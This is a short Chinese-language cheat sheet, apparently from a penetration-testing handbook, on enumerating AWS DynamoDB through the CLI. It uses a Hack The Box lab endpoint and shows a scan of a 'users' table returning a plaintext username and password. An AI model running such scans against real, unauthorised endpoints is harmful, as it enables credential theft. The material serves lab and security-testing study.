# AWS - 服务 - DynamoDB

> Amazon DynamoDB 是一种键值和文档数据库，可在任何规模下提供个位数毫秒级的性能。它是一种完全托管的、多区域的、多活的、持久的数据库，具有内置的安全性、备份和恢复功能，以及用于互联网规模应用程序的内存缓存。DynamoDB 每天可处理超过 10 万亿个请求，并可支持每秒超过 2000 万个请求的峰值。

## 列出表 (List Tables)

```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables        

{
    "TableNames": [
        "users"
    ]
}
```

## 枚举表内容 (Enumerate Table Content)

```bash
$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]'

{
  "password": {
    "S": "Management@#1@#"
  },
  "username": {
    "S": "Mgmt"
  }
}
```

## 参考资料 (References)

* [Amazon DynamoDB Documentation - AWS](https://docs.aws.amazon.com/dynamodb/)
